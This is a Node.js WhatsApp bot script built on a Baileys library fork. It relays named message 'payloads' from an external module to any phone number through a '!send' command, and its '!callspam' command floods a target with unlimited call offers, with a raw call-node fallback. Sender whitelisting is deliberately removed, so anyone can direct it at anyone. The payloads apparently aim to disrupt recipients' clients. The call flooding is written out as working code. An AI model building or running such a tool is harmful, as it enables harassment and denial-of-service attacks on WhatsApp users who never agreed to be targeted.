import {
  makeWASocket,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  proto,
  Browsers,
  DisconnectReason,
} from '@lordmega/baileys'
import crypto from 'node:crypto'

let qrcode = null
try {
  qrcode = (await import('qrcode-terminal')).default
} catch {
  console.warn('[qr] qrcode-terminal not installed — run: npm i qrcode-terminal')
}

// No whitelist — every number is allowed.
const isAllowed = () => true

const normalizeJid = (jid) => {
  const bare = String(jid || '')
    .replace(/@[\w.-]+$/, '')
    .replace(/[+\s()-]/g, '')
  if (!bare) return ''
  return /^\d+$/.test(bare) ? `${bare}@s.whatsapp.net` : bare
}

// ---------------------------------------------------------------------------
// Load payloads + detection filter (defensively, so a missing file can't brick the bot)
// ---------------------------------------------------------------------------
const { payloads } = await import('./payloads.mjs')

let scoreMessage = null
try {
  const detect = await import('./detect.mjs')
  scoreMessage = detect.scoreMessage || null
  console.log('[detect] scoreMessage() loaded from detect.mjs')
} catch (err) {
  console.warn(`[detect] detect.mjs not found / no scoreMessage export (${err.message}) — auto-detection disabled`)
}

const wireSize = (msg) => {
  try {
    const info = proto.WebMessageInfo.fromObject({
      key: msg.key,
      message: msg.message,
      messageTimestamp: Math.floor(Date.now() / 1000),
    })
    return proto.WebMessageInfo.encode(info).length
  } catch {
    try {
      return Buffer.byteLength(JSON.stringify({ key: msg.key, message: msg.message }))
    } catch {
      return -1
    }
  }
}

// ---------------------------------------------------------------------------
// Session
// ---------------------------------------------------------------------------
const { state, saveCreds } = await useMultiFileAuthState('auth_info')
const sock = makeWASocket({
  auth: state,
  printQRInTerminal: false,
  browser: Browsers.ubuntu('Chrome'),
})

sock.ev.on('creds.update', ({ latest }) => {
  if (latest && qrcode) {
    console.log('[qr] Scan this QR code with WhatsApp > Linked Devices:')
    qrcode.generate(latest, { small: true })
  } else if (latest) {
    console.log('[qr] QR available — install qrcode-terminal to render it.')
  }
})

sock.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect, qr } = update
  if (qr) {
    if (qrcode) {
      console.log('[qr] Scan this QR code with WhatsApp > Linked Devices:')
      qrcode.generate(qr, { small: true })
    }
    return
  }
  console.log('[conn]', connection || 'update')
  if (connection === 'close') {
    const statusCode = lastDisconnect?.error?.output?.statusCode
    const shouldReconnect = statusCode !== DisconnectReason.loggedOut
    console.log('[conn] closed', lastDisconnect?.error?.message || '', '-> reconnect:', shouldReconnect)
    if (shouldReconnect) setTimeout(startBot, 3000)
  }
})

// ---------------------------------------------------------------------------
// Call offer — prefer native offerCall, fall back to raw call node if missing
// ---------------------------------------------------------------------------
async function sendCallOffer(target, count = 1) {
  const offers = Math.max(1, count) // no clamp
  for (let i = 0; i < offers; i++) {
    if (typeof sock.offerCall === 'function') {
      await sock.offerCall(target, { isVideo: false })
    } else {
      await sendRawCallNode(target)
    }
    if (i < offers - 1) await new Promise(r => setTimeout(r, 1500))
  }
  return offers
}

async function sendRawCallNode(target) {
  const devices = await sock
    .getUSyncDevices([target], false, false)
    .then(ds => ds.map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`))
  await sock.assertSessions(devices)
  const { nodes: destinations } = await sock.createParticipantNodes(
    devices,
    { conversation: 'y' },
    { count: '0' }
  )
  const callNode = {
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': crypto.randomBytes(16).toString('hex').toUpperCase(),
        'call-creator': sock.user.id,
      },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'video', attrs: { orientation: '0', screen_width: '1920', screen_height: '1080', device_orientation: '0', enc: 'vp8', dec: 'vp8' } },
        { tag: 'net', attrs: { medium: '3' } },
        { tag: 'capability', attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: 'encopt', attrs: { keygen: '2' } },
        { tag: 'destination', attrs: {}, content: destinations },
      ],
    }],
  }
  await sock.sendNode(callNode)
}

// ---------------------------------------------------------------------------
// Command handling
// ---------------------------------------------------------------------------
async function resolvePayload(name) {
  const needle = String(name || '').trim()
  if (!needle) return null
  if (payloads[needle]) return { name: needle, payload: payloads[needle] }
  const withJs = payloads[`${needle}.js`]
  if (withJs) return { name: `${needle}.js`, payload: withJs }
  const fuzzy = Object.keys(payloads).find(k => k.toLowerCase().startsWith(needle.toLowerCase()))
  if (fuzzy) return { name: fuzzy, payload: payloads[fuzzy] }
  return null
}

async function handleCommand(sender, text, from) {
  const [cmd, ...rest] = text.slice(1).trim().split(/\s+/)

  if (cmd === 'ping') {
    await sock.sendMessage(from, { text: `pong (sender: ${sender})` })
    return
  }

  if (cmd === 'list') {
    await sock.sendMessage(from, { text: `Available payloads:\n${Object.keys(payloads).map(k => `- ${k}`).join('\n')}` })
    return
  }

  if (cmd === 'send') {
    const [payloadName, targetRaw, ...extra] = rest
    const target = normalizeJid(targetRaw || '')
    if (!target) {
      await sock.sendMessage(from, { text: `[!send] invalid target: ${targetRaw}` })
      return
    }
    const found = await resolvePayload(payloadName)
    if (!found) {
      await sock.sendMessage(from, { text: `[!send] unknown payload: ${payloadName}` })
      return
    }
    const extraArg = extra.join(' ')
    const opts = extraArg ? { [extraArg]: true } : {}
    try {
      const msg = generateWAMessageFromContent(target, found.payload, opts)
      await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
      const bytes = wireSize(msg)
      await sock.sendMessage(from, { text: `[!send] delivered "${found.name}" -> ${target} (wire size: ${bytes} bytes)` })
    } catch (err) {
      await sock.sendMessage(from, { text: `[!send] failed: ${err.message}` })
    }
    return
  }

  if (cmd === 'calltest' || cmd === 'callspam') {
    const target = normalizeJid(rest[0] || '')
    if (!target) {
      await sock.sendMessage(from, { text: `[${cmd}] invalid target: ${rest[0]}` })
      return
    }
    const count = cmd === 'callspam' ? parseInt(rest[1] || '1', 10) : 1
    try {
      const sent = await sendCallOffer(target, count)
      await sock.sendMessage(from, { text: `[${cmd}] sent ${sent} call offer(s) to ${target}` })
    } catch (err) {
      await sock.sendMessage(from, { text: `[${cmd}] failed: ${err.message}` })
    }
    return
  }

  await sock.sendMessage(from, { text: 'Commands: !ping | !list | !send <payload> <target_jid> | !calltest <target_jid> | !callspam <target_jid> [count]' })
}

// ---------------------------------------------------------------------------
// Incoming messages
// ---------------------------------------------------------------------------
sock.ev.on('messages.upsert', async ({ messages, type }) => {
  for (const m of messages) {
    const content = m.message
    if (!content) continue

    // Auto-detection: log-only, never blocks or replies.
    if (scoreMessage) {
      try {
        const verdict = scoreMessage(content)
        const out = typeof verdict === 'object' ? JSON.stringify(verdict) : String(verdict)
        console.log(`[detect] ${m.key?.remoteJid || '?'} -> score ${out}`)
      } catch (err) {
        console.warn(`[detect] scoreMessage threw: ${err.message}`)
      }
    }

    if (type !== 'notify') continue

    const sender = m.key.participant || m.key.remoteJid
    const text = content.conversation
      || content.extendedTextMessage?.text
      || content.messageContextInfo?.messageParamsJson
      || (content.viewOnceMessage?.message?.conversation)
      || (content.viewOnceMessage?.message?.extendedTextMessage?.text)

    // No sender whitelist – accept from anyone.
    if (typeof text !== 'string' || !text.startsWith('!')) continue

    try {
      await handleCommand(sender, text, m.key.remoteJid)
    } catch (err) {
      console.warn('[cmd] handler error:', err)
    }
  }
})

// ---------------------------------------------------------------------------
// Keepalive + start
// ---------------------------------------------------------------------------
function startBot() {
  sock.start?.() || null
}
sock.ev.on('creds.update', saveCreds)

setInterval(async () => {
  try {
    await sock.sendPresenceUpdate('available')
  } catch {
    /* socket closing — ignore */
  }
}, 25000)

console.log('[bot] unrestricted – any sender can command, any target accepted.')
console.log('[bot] ready. Send !ping from any number to verify.')